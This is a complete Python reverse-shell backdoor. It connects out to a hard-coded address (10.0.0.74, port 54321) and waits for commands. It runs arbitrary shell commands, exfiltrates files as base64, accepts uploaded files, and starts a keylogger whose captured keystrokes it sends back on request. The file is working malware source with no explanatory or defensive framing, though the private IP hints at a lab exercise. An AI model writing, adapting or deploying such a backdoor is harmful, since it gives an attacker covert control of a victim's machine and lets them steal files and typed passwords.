#!/usr/bin/python
import socket
import os
import subprocess
import json
import base64
import threading
import keylogger

def reliable_send(data):
    json_data = json.dumps(data)
    sock.send(json_data)

def reliable_recv():
    data = ""
    while True:
        try:
            data = data + sock.recv(1024)
            return json.loads(data)
        except ValueError:
            continue

def shell():
    while True:
        command = reliable_recv()
        if command == 'q':
            break
        elif command[:2] == "cd":
            try:
                os.chdir(command[3:])
            except:
                continue
        elif command[:8] == "download":
            with open(command[9:], "rb") as file:
                reliable_send(base64.b64encode(file.read()))
        elif command[:6] == "upload":
            try:
                with open(command[7:], "wb") as fin:
                    file_data = reliable_recv()
                    fin.write(base64.b64decode(file_data))
            except:
                failed = "Failed to uplaod file\n"
                reliable_send(failed)
        elif command[:12] == "keylog_start":
            t1 = threading.Thread(target=keylogger.start)
            t1.start()
        elif command[:11] == "keylog_dump":
            fn = open(keylogger_path, "r")
            reliable_send(fn.read())
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            reliable_send(result)

keylogger_path = os.getcwd() + "/keystrokes.txt"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("10.0.0.74", 54321))
shell()
sock.close()
